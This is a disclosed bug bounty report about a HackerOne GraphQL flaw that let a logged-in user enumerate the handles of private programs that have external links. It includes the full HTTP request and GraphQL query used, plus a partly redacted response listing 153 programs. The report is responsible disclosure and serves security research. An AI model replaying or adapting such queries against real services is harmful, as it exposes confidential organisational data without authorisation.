# Disclosure handle private program with external link

## Report Details
- **Report ID**: 1276992
- **URL**: https://hackerone.com/reports/1276992
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-25T05:37:57.885Z
- **Disclosed**: 2021-08-24T16:48:29.463Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hi team.

It looks like we can identify private programs that have an external link

### Steps To Reproduce


1. 
```http
POST /graphql HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 168
accept: */*
X-Auth-Token: your_token
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
content-type: application/json
Origin: https://hackerone.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: your_cookie

{"query":"{teams(last:100,where:{_and:[{roles:is_has_published_external_program},{roles:is_private}]}){total_count,nodes{_id,handle,state,participants{total_count}}}}"}
```

Answer:

```code
{"data":{"teams":{"total_count":153,"nodes":[{"_id":"███████","handle":"████","state":null,"participants":null},.....REDACT....{"_id":"49805","handle":"security-test-ep-invite-only","state":null,"participants":null},"handle":"█████","state":null,"participants":null}]}}}
```
As we can see program for proof : @security-test-ep-invite-only
If this is the correct answer, then there are a total of 153 private programs with external links

Thanks!

## Impact

Disclosure handle private program with external link

## Attachments
No attachments
